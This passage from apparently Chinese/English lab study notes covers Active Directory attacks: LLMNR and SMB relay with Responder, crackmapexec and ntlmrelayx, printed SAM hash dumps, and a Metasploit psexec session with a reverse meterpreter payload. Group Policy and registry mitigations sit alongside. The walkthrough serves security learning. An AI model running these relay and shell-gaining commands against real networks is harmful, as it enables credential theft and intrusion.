class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#1.........:   493.8 kH/s (0.97ms) @ Accel:512 Loops:1 Thr:1 Vec:8</span><br><span class="line">Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)</span><br><span class="line">Progress.........: 4096/14344394 (0.03%) <span class="comment">#花了多少比例才找到這密碼</span></span><br><span class="line">Rejected.........: 0/4096 (0.00%)</span><br><span class="line">Restore.Point....: 2048/14344394 (0.01%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.#1....: paris -&gt; soccer8</span><br><span class="line">Hardware.Mon.#1..: Util: 26%</span><br><span class="line"></span><br><span class="line">Started: Mon Feb 19 02:48:22 2024</span><br><span class="line">Stopped: Mon Feb 19 02:48:27 2024</span><br></pre></td></tr></table></figure>

<h2 id="LLMNR-Poisoning-Mitigation"><a href="#LLMNR-Poisoning-Mitigation" class="headerlink" title="LLMNR Poisoning Mitigation"></a><strong>LLMNR Poisoning Mitigation</strong></h2><p>補救及緩解措施 &gt; <strong>主要防禦 – 停用 LLMNR 和 NBT-NS</strong></p>
<p>LLMNR是一種協議，允許 IPv4 和 IPv6 主機對同一本機網路上的主機執行名稱解析，而無需 DNS 伺服器或 DNS 配置</p>
<p>當主機的 DNS 查詢失敗（即 DNS 伺服器不知道名稱）時，主機會在本地網路上廣播 LLMNR 請求，以查看是否有其他主機可以回應。</p>
<p>LLMNR 沒有身份驗證機制。  任何人都可以回應 LLMNR 請求</p>
<p>要透過 GPO 停用 NBT-NS，我們只需編寫一個 PowerShell 腳本並將其保存在啟動腳本中。</p>
<p>add the script to Startup Scripts in <strong>Computer Configuration &gt; Policies &gt; Windows Settings &gt; Scripts &gt; Startup</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces\tcpip* -Name NetbiosOptions -Value 2**</span><br></pre></td></tr></table></figure>

<p>The best defense in this case is to disable LLMNR and NBT-NS.<br>● To disable LLMNR, select “Turn OFF Multicast Name Resolution” under Local Computer Policy &gt; Computer Configuration &gt; Administrative Templates &gt; Network &gt; DNS Client in the Group Policy Editor.</p>
<ul>
<li><strong>若要停用 NBT-NS，請導覽至網路連線 &gt; 網路介面卡屬性 &gt; TCP&#x2F;IPv4 屬性 &gt; 進階選項卡 &gt; WINS 選項卡，然後選擇「停用 TCP&#x2F;IP 上的 NetBIOS」。這僅適用於本地</strong></li>
</ul>
<p><img src="/img/ADInitial_Untitled_5.png" alt="Untitled"></p>
<p>If a company must use or cannot disable LLMNR&#x2F;NBT-NS,the best course of action is to:</p>
<ul>
<li><p>Require Network Access Control.</p>
<ul>
<li>Example : 將設備聯網，不應該讓他很輕鬆就直接連到網路，而是這中間應該要有些權限設置、要求用戶設置設備訪問密碼，降低破解機率</li>
</ul>
</li>
<li><p><strong>• 需要強用戶密碼（例如，長度&gt;14 個字元並限制常用單字的使用）。密碼越複雜、越長，攻擊者就越難破解雜湊值。</strong></p>
</li>
<li><p>可以利用它而不是關閉元素LLMNR</p>
</li>
<li><p>Group Policy Managemnet → Forest.. → Domain → Default Domain Police → Edit</p>
</li>
</ul>
<p>Policies → Administrative… → Network → DNS Client → turn off multicast → Enable</p>
<p><img src="/img/ADInitial_Untitled_6.png" alt="Untitled"></p>
<p><img src="/img/ADInitial_Untitled_7.png" alt="Untitled"></p>
<p><img src="/img/ADInitial_Untitled_8.png" alt="Untitled"></p>
<h3 id="確認緩解措施"><a href="#確認緩解措施" class="headerlink" title="確認緩解措施"></a><strong>確認緩解措施</strong></h3><p><strong>我們可以透過在 PowerShell 中執行以下命令並收到「0」返回來確認我們已緩解 LLMNR：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**$(Get-ItemProperty -Path <span class="string">&quot;HKLM:\Software\Policies\Microsoft\Windows NT\DNSClient&quot;</span> -name EnableMulticast).EnableMulticast**</span><br></pre></td></tr></table></figure>

<p><img src="/img/ADInitial_Untitled_9.png" alt="Untitled"></p>
<p><strong>我們可以透過在 cmd.exe 中執行以下命令並收到「2」作為回報來確認我們已緩解 NBT-NS：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**wmic nicconfig get caption,index,TcpipNetbiosOptions**</span><br></pre></td></tr></table></figure>

<p><img src="/img/ADInitial_Untitled_10.png" alt="Untitled"></p>
<h2 id="SMB-Relay-Attacks-Overview"><a href="#SMB-Relay-Attacks-Overview" class="headerlink" title="SMB Relay Attacks Overview"></a><strong>SMB Relay Attacks Overview</strong></h2><p><a target="_blank" rel="noopener" href="https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/">https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/</a></p>
<p>伺服器訊息塊(SMB) 用作網路檔案共享協定。它使電腦應用程式能夠讀取、寫入檔案以及請求網路中的伺服器程式服務。</p>
<p>SMB 在 Windows 環境中廣泛採用，提供對文件和印表機等資源的共用存取。然而，當與NTLM (NT LAN Manager) 驗證配合使用且不安全時，它就會成為中繼攻擊的主要目標。從本質上講，攻擊者操縱了協定對網路使用者的固有信任。</p>
<ul>
<li>SMB 遭受relay attack的核心漏洞源自於其身分驗證機制，尤其是在使用 NTLM 時</li>
<li>當使用者尋求存取共享資源時，SMB 會啟動連線並對使用者進行身份驗證</li>
<li>攻擊者可以抓住此身份驗證嘗試，將其轉發到不同的伺服器以冒充用戶</li>
<li>由於缺乏 SMB 對身份驗證請求的來源或目的地的驗證（透過 SMB 簽署），攻擊者可以利用它進行未經授權的存取。</li>
<li>What is SMB Relay?<ul>
<li>Instead of cracking hashes gathered with Responder,we can instead relay those<br>  hashes to specific machines and potentially gain access</li>
<li>Requirements<ul>
<li><strong>SMB signing</strong> must be disabled or not enforced on the target</li>
<li>Relayed user credentials must be admin on machine for any real value</li>
</ul>
</li>
</ul>
</li>
<li>也許你正在捕獲hash，但實際上並沒有破解，也許密碼政策真的不錯，但可以通過SMB Relay訪問機器</li>
<li><strong>由於這些憑證經過中繼，因此密碼強度變得無關緊要</strong></li>
<li><strong>注意：預設情況下，所有 Windows 工作站（非伺服器）都停用或不強制執行 SMB 簽章。</strong></li>
<li>它在伺服器上啟用或強制執行並不意味你不會遇到啟用了SMB signing的工作站</li>
<li>或者將遇到或不會遇到禁用SMB簽名的工作站</li>
<li>網域控制器目前不會啟用該功能，相關用戶憑據必須是電腦上的管理員(本地管理員)才能有利用價值</li>
</ul>
<p>攻擊順序：</p>
<ul>
<li>攻擊者識別易受攻擊的工作站的 IP。</li>
<li>攻擊者啟動<strong>relay attack</strong>所需的工具。</li>
<li>接下來，發生一個事件（例如 LLMNR <strong>Poisoning</strong> ），導致用戶雜湊在幕後被攔截。</li>
<li>最後，攻擊者轉發截獲的憑證，獲得未經授權的存取。</li>
</ul>
<h3 id="Identify-Hosts-Without-SMB-Signing"><a href="#Identify-Hosts-Without-SMB-Signing" class="headerlink" title="Identify Hosts Without SMB Signing"></a>Identify Hosts Without SMB Signing</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#腳本會嘗試以訪客使用者身分連接到目標的偵聽 SMB2 服務。然後它將提供有關該服務的資訊</span></span><br><span class="line">**nmap --script smb2-security-mode.nse -p445 &lt;目標ip&gt;**</span><br><span class="line"></span><br><span class="line">訊息簽名可能產生三種結果：</span><br><span class="line"></span><br><span class="line">&gt; 訊息簽名已停用</span><br><span class="line">&gt; 訊息簽名已啟用但不是必需的（SMB2 的預設）</span><br><span class="line">&gt; 已啟用且需要訊息簽名</span><br></pre></td></tr></table></figure>

<p>在 SMB 中繼攻擊期間，攻擊者會捕獲有效的身份驗證會話，然後中繼它，從而獲得存取權限。攻擊者可以轉發這些雜湊值以進行未經授權的訪問，而不是破解雜湊值。</p>
<p><img src="/img/ADInitial_Untitled_11.png" alt="Untitled"></p>
<p>上圖顯示了未強制執行 SMB 簽章的工作站。這是 所有 Windows 工作站的預設設定。</p>
<p>我們將收集所有未強制執行 SMB 簽章的工作站，並將它們放入名為Targets.txt的檔案中</p>
<h3 id="make-some-configuration-changes-to-responder"><a href="#make-some-configuration-changes-to-responder" class="headerlink" title="make some configuration changes to responder"></a>make some configuration changes to responder</h3><p>我們將利用 Responder 和 ntlmrelayx 進行攻擊。我們必須先正確配置 Responder 以停用 SMB 和 HTTP 回應，因為這些回應將會轉送到 ntlmrelayx（最終中繼）。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano /etc/responder/Responder.conf</span><br></pre></td></tr></table></figure>

<ul>
<li>hash are not being captured, but ther’re actually being relayed</li>
</ul>
<p><img src="/img/ADInitial_Untitled_12.png" alt="Untitled"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**<span class="built_in">sudo</span> responder –I eth0 -dwP**</span><br></pre></td></tr></table></figure>

<p><img src="/img/ADInitial_Untitled_13.png" alt="Untitled"></p>
<p>最後，將啟動 ntlmrelayx 並等待事件發生</p>
<ul>
<li>set that up with target file that’s going to be the host that we identified with SMB signing disable or not enforced, then we’re going to have that run</li>
<li>when responder capture a hash, it’s actually going to forward that over to this NTLM relay</li>
<li>going to forward that hash over to the targets selected</li>
<li>If we’re a local administrator on the machine with the hash we capture, we will get some win</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://github.com/Porchetta-Industries/CrackMapExec">https://github.com/Porchetta-Industries/CrackMapExec</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **crackmapexec smb 192.168.19.2/24 --gen-relay-list target.txt**</span><br><span class="line">SMB         192.168.19.1    445    MSI              [*] Windows 10.0 Build 19041 x64 (name:MSI) (domain:MSI) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         192.168.19.140  445    HYDRA-DC         [*] Windows 10.0 Build 20348 x64 (name:HYDRA-DC) (domain:MARVEL.<span class="built_in">local</span>) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         192.168.19.149  445    THEPUNISHER      [*] Windows 10.0 Build 19041 x64 (name:THEPUNISHER) (domain:MARVEL.<span class="built_in">local</span>) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         192.168.19.150  445    SPIDERMAN        [*] Windows 10.0 Build 19041 x64 (name:SPIDERMAN) (domain:MARVEL.<span class="built_in">local</span>) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         192.168.19.130  445    WIN-3FH6WOQ6P1W  [*] b<span class="string">&#x27;W\x00i\x00n\x00d\x00o\x00w\x00s\x00 \x00S\x00e\x00r\x00v\x00e\x00r\x00 \x002\x000\x000\x003\x00 \x003\x007\x009\x000\x00 \x00S\x00e\x00r\x00v\x00i\x00c\x00e\x00 \x00P\x00a\x00c\x00k\x00 \x002\x00&#x27;</span> (name:WIN-3FH6WOQ6P1W) (domain:WIN-3FH6WOQ6P1W.KCL2.LOCAL) (signing:False) (SMBv1:True)</span><br><span class="line">...</span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# <span class="built_in">cat</span> target.txt                                              </span><br><span class="line">192.168.19.1</span><br><span class="line">192.168.19.149</span><br><span class="line">192.168.19.150</span><br></pre></td></tr></table></figure>

<p><strong>使用 CME 枚舉 SMB 伺服器以及是否需要 SMB 訊息簽名</strong>，以及連接並執行後期利用活動。</p>
<p>使用 CME 來尋找 AD 網路 (192.168.19.2&#x2F;24) 上的所有 SMB 伺服器，並另外尋找那些不需要訊息簽署的伺服器。它將那些不存在的檔案儲存到檔案名稱target.txt  。</p>
<p>啟動<a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx</a>來中繼憑證</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ntlmrelayx.py -tf target.txt -smb2support**</span><br><span class="line">Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Protocol Client SMTP loaded..</span><br><span class="line">/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="keyword">for</span> it is now deprecated <span class="keyword">in</span> cryptography, and will be removed <span class="keyword">in</span> the next release.</span><br><span class="line">[*] Protocol Client MSSQL loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[*] Protocol Client HTTP loaded..</span><br><span class="line">[*] Protocol Client IMAPS loaded..</span><br><span class="line">[*] Protocol Client IMAP loaded..</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Running <span class="keyword">in</span> relay mode to hosts <span class="keyword">in</span> targetfile</span><br><span class="line">[*] Setting up SMB Server</span><br><span class="line">[*] Setting up HTTP Server</span><br><span class="line"></span><br><span class="line">[*] Servers started, waiting <span class="keyword">for</span> connections</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p>need to an event to occur, point this directly to ourselves and that relay is going to happen</p>
<p>在受害機上開啟檔案總管並輸入\192.168.19.130連線到攻擊者</p>
<p><img src="/img/ADInitial_Untitled_14.png" alt="Untitled"></p>
<p>Attack succeeded or this authentication succeeded</p>
<ul>
<li>dumps out for us the hashs of SAM</li>
</ul>
<p>Once we have this hash for the administrator, we can use that to login to the machine</p>
<p>An event (such as LLMNR poisoning) has occurred.  Responder will capture this event, pass it to ntlmrelayx, which will relay the credentials to the targets in our targets.txt file.</p>
<p>再輸入\192.168.19.130會回傳credentials 回攻擊機</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] SMBD-Thread-3: Received connection from 192.168.19.149, attacking target smb://192.168.19.150</span><br><span class="line">[-] SMBCLient error: [Errno Connection error (192.168.19.150:445)] [Errno 113] No route to host</span><br><span class="line">[*] SMBD-Thread-3: Received connection from 192.168.19.149, attacking target smb://192.168.19.149</span><br><span class="line">[*] SMBD-Thread-4: Received connection from 192.168.19.149, attacking target smb://192.168.19.1</span><br><span class="line">[-] Authenticating against smb://192.168.19.1 as MARVEL\fcastle FAILED</span><br><span class="line">[*] SMBD-Thread-5: Received connection from 192.168.19.149, attacking target smb://192.168.19.150</span><br><span class="line">[*] Authenticating against smb://192.168.19.150 as MARVEL\fcastle SUCCEED</span><br><span class="line">[*] Service RemoteRegistry is <span class="keyword">in</span> stopped state</span><br><span class="line">[*] Service RemoteRegistry is disabled, enabling it</span><br><span class="line">[*] Starting service RemoteRegistry</span><br><span class="line">[*] Target system bootKey: 0x270eea595503845c7b7af622ad54e71e</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">**Administrator:500:aad3b435b51404eeaad3b435b51404ee:60db62e093ebf3b9270cf92898f7cc03:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:388347163f7f36db1640f63ff0e9e374:::</span><br><span class="line">peterparker:1001:aad3b435b51404eeaad3b435b51404ee:9d45c944752dc08356c32926dbd53bb1:::**</span><br></pre></td></tr></table></figure>

<p>正如您在此處所看到的，本機 SAM hash已被轉儲。這些哈希值現在可以離線並破解。更好的是，我們可以利用哈希傳遞攻擊來存取機器而無需破解密碼。</p>
<p>注意：我們沒有也沒有必要破壞網域帳戶。同樣，中繼攻擊的優點在於您不需要知道密碼即可完成攻擊。</p>
<p>SAM</p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/259">https://forum.butian.net/share/259</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/blob/master/examples/secretsdump.py">https://github.com/fortra/impacket/blob/master/examples/secretsdump.py</a></p>
<ul>
<li>SAM(安全帳戶管理器)，SAM存放在註冊表中</li>
<li><strong>SAM用來儲存Windows作業系統密碼的資料庫文件</strong></li>
<li>為了避免明文密碼洩露，SAM文件中保存的是明文密碼經過一系列演算法處理過的Hash值，被保存的Hash分為LM Hash（已廢棄）和NTLMHash（長度32bit由字母數字組成）</li>
<li>現在用戶憑證是以NTLM HASH形式保存</li>
<li>當使用者在本地或遠端登陸系統時，會將Hash值與SAM檔案中儲存的Hash值進行比較</li>
<li>在後期的Windows系統中，SAM檔案中被儲存的密碼Hash都被金鑰SYSKEY加密，接下來將對SAM進行利用</li>
</ul>
<p><strong>除了轉儲本地 SAM 雜湊值之外，還可以透過 SMB 中繼攻擊獲得其他樂趣。例如，我們可以獲得機器上的 shell 存取權限：</strong></p>
<p>get an interactive shell as opposed to just getting that SAM dump</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx.py –tf targets.txt –smb2support -i</span><br></pre></td></tr></table></figure>

<p><img src="/img/ADInitial_Untitled_15.png" alt="Untitled"></p>
<ul>
<li>thorugh the file system - machine、shares..<ul>
<li>do a lot different things here via the shell that we have created</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 127.0.0.1 11000</span><br></pre></td></tr></table></figure>

<p><img src="/img/ADInitial_Untitled_16.png" alt="Untitled"></p>
<p><strong>可以遠端運行命令。在此範例中，我們將在中繼攻擊期間簡單地執行“whoami”。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx –tf targets.txt –smb2support –c “<span class="built_in">whoami</span>”</span><br></pre></td></tr></table></figure>

<p><img src="/img/ADInitial_Untitled_17.png" alt="Untitled"></p>
<p>If you get that SAM dump you’re gonna be fine anyway</p>
<h3 id="如何緩解-SMB-中繼攻擊？"><a href="#如何緩解-SMB-中繼攻擊？" class="headerlink" title="如何緩解 SMB 中繼攻擊？"></a><strong>如何緩解 SMB 中繼攻擊？</strong></h3><p>Mitigation Strategies:</p>
<ul>
<li>Enable SMB Signing on all devices<ul>
<li>Pro:Completely stops the attack</li>
<li>Con:Can cause performance issues with file copies</li>
</ul>
</li>
<li>Disable NTLM authentication on network<ul>
<li>Pro:Completely stops the attack</li>
<li>Con:If Kerberos stops working,Windows defaults back to NTLM</li>
</ul>
</li>
<li>Account tiering:<ul>
<li>Pro:Limits domain admins to specific tasks (e.g.only log onto servers with need for DA)</li>
<li>Con:Enforcing the policy may be difficult</li>
</ul>
</li>
<li>Local admin restriction:<ul>
<li>Pro:Can prevent a lot of lateral movement</li>
<li>Con:Potential increase in the amount of service desk tickets</li>
</ul>
</li>
</ul>
<p>主要防禦 - 在所有裝置上啟用 SMB 簽名</p>
<p>優點：這可以完全阻止攻擊。<br>缺點：這可能會導致使用 SMBv1 的檔案副本和舊裝置出現效能問題。</p>
<p>若要強制執行 SMB 簽名，請在電腦Group Policy ..&gt;</p>
<p>Computer Configuration &gt; Policies &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; Security Options:</p>
<p>在客戶端：</p>
<ul>
<li>Microsoft 網路用戶端：對通訊進行數位簽署（始終）</li>
<li>Microsoft 網路用戶端：對通訊進行數位簽署（如果伺服器同意）</li>
</ul>
<p>在伺服器端：</p>
<ul>
<li>Microsoft 網路伺服器：對通訊進行數位簽章（始終）</li>
<li>Microsoft 網路伺服器：對通訊進行數位簽章（如果客戶同意）</li>
</ul>
<p><img src="/img/ADInitial_Untitled_18.png" alt="Untitled"></p>
<p><strong>確認我們的緩解措施</strong></p>
<p>我們可以透過在 cmd.exe 中執行以下命令並收到兩項返回的<strong>「0x1」</strong>來確認我們已緩解 SMB 中繼攻擊：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reg query HKLM\System\CurrentControlSet\Services\LanManServer\Parameters | findstr /I securitysignature</span><br></pre></td></tr></table></figure>

<p><img src="/img/ADInitial_Untitled_19.png" alt="Untitled"></p>
<p>替代防禦</p>
<p>如果公司無法在所有裝置上強制執行 SMB 簽名，最好的做法是：</p>
<ul>
<li>利用帳戶分層。例如，如果 Bob 是網域管理員，Bob 將有兩個帳戶：「bob」和「bob-da」。<ul>
<li>這將限制網域管理員執行特定任務（例如，僅登入需要網域管理員的伺服器）。</li>
</ul>
</li>
<li>本機管理員限制。限制本地管理員將使中繼攻擊變得更加困難。</li>
</ul>
<h2 id="Gaining-Shell-Access"><a href="#Gaining-Shell-Access" class="headerlink" title="Gaining Shell Access"></a><strong>Gaining Shell Access</strong></h2><p>capture some hashes、crack some password via a SAM dump in relay attack</p>
<p>using a module called <code>psexec</code> </p>
<p>psexec.py能夠獲得在目標為windows的主機的互動式shell，只需要獲取使用者名稱以及密碼</p>
<p>do this with a password</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**msfconsole**</span><br><span class="line">...</span><br><span class="line">   4   auxiliary/scanner/smb/psexec_loggedin_users                   normal     No     Microsoft Windows Authenticated Logged In Users Enumeration</span><br><span class="line">   **5   exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution**</span><br><span class="line">   6   auxiliary/admin/smb/psexec_ntdsgrab                           normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility</span><br><span class="line">   7   exploit/windows/local/current_user_psexec    1999-01-01       excellent  No     PsExec via Current User Token</span><br><span class="line">   8   encoder/x86/service                                           manual     No     Register Service</span><br><span class="line">   9   auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal     No     WMI Exec</span><br><span class="line">   10  exploit/windows/smb/webexec                  2018-10-24       manual     No     WebExec Authenticated User Code Execution</span><br><span class="line">   11  exploit/windows/local/wmi                    1999-01-01       excellent  No     Windows Management Instrumentation (WMI) Remote Command Execution</span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 11, use 11 or use exploit/windows/local/wmi</span><br><span class="line"></span><br><span class="line">msf6 &gt; use 5</span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/psexec):</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting  Required  Description</span><br><span class="line">   ----                  ---------------  --------  -----------</span><br><span class="line">   RHOSTS                                 <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com</span><br><span class="line">                                                    /docs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT                 445              <span class="built_in">yes</span>       The SMB service port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                    no        Service description to be used on target <span class="keyword">for</span> pretty</span><br><span class="line">                                                     listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                   no        The service display name</span><br><span class="line">   SERVICE_NAME                           no        The service name</span><br><span class="line">   SMBDomain             .                no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                                no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBSHARE                               no        The share to connect to, can be an admin share (ADM</span><br><span class="line">                                                    IN$,C$,...) or a normal <span class="built_in">read</span>/write folder share</span><br><span class="line">   SMBUser                                no        The username to authenticate as</span><br><span class="line"></span><br><span class="line">**Payload options (windows/meterpreter/reverse_tcp):**</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           <span class="built_in">yes</span>       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br></pre></td></tr></table></figure>

<p><strong>Payload options &gt; the target machine is 64bit machine，</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec) &gt; **<span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp**</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; **options**</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/psexec):</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting  Required  Description</span><br><span class="line">   ----                  ---------------  --------  -----------</span><br><span class="line">   RHOSTS                                 <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com</span><br><span class="line">                                                    /docs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT                 445              <span class="built_in">yes</span>       The SMB service port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                    no        Service description to be used on target <span class="keyword">for</span> pretty</span><br><span class="line">                                                     listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                   no        The service display name</span><br><span class="line">   SERVICE_NAME                           no        The service name</span><br><span class="line">   SMBDomain             .                no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                                no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBSHARE                               no        The share to connect to, can be an admin share (ADM</span><br><span class="line">                                                    IN$,C$,...) or a normal <span class="built_in">read</span>/write folder share</span><br><span class="line">   SMBUser                                no        The username to authenticate as</span><br><span class="line"></span><br><span class="line">**Payload options (windows/x64/meterpreter/reverse_tcp):**</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           <span class="built_in">yes</span>       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"><span class="comment">#針對option中需要填寫的項目寫入目標機器資訊</span></span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; <span class="built_in">set</span> rhost 192.168.19.149 <span class="comment">#目標是fcastle在THEPUNISHER那台機器</span></span><br><span class="line">rhost =&gt; 192.168.19.149</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; **<span class="built_in">set</span> smbdomain MARVEL.<span class="built_in">local</span>** </span><br><span class="line">smbdomain =&gt; MARVEL.<span class="built_in">local</span></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; **<span class="built_in">set</span> smbuser fcastle**</span><br><span class="line">smbuser =&gt; fcastle</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; **<span class="built_in">set</span> smbpass Password1**</span><br><span class="line">smbpass =&gt; Password1</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/psexec):</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting  Required  Description</span><br><span class="line">   ----                  ---------------  --------  -----------</span><br><span class="line">   RHOSTS                192.168.19.149   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com</span><br><span class="line">                                                    /docs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT                 445              <span class="built_in">yes</span>       The SMB service port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                    no        Service description to be used on target <span class="keyword">for</span> pretty</span><br><span class="line">                                                     listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                   no        The service display name</span><br><span class="line">   SERVICE_NAME                           no        The service name</span><br><span class="line">   SMBDomain             MARVEL.<span class="built_in">local</span>     no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass               Password1        no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBSHARE                               no        The share to connect to, can be an admin share (ADM</span><br><span class="line">                                                    IN$,C$,...) or a normal <span class="built_in">read</span>/write folder share</span><br><span class="line">   SMBUser               fcastle          no        The username to authenticate as</span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           <span class="built_in">yes</span>       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; show targets </span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">    Id  